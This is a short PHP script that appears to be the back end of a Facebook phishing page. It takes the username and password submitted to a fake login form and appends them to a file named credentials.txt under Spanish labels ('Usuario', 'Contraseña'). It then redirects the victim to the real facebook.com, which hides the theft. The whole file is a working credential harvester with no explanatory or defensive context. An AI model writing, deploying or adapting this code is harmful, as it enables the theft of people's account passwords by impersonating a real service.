<?php

file_put_contents("credentials.txt", "[+] Facebook -> Usuario: " . $_POST['username'] . " Contraseña: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://facebook.com/');
exit();
?>
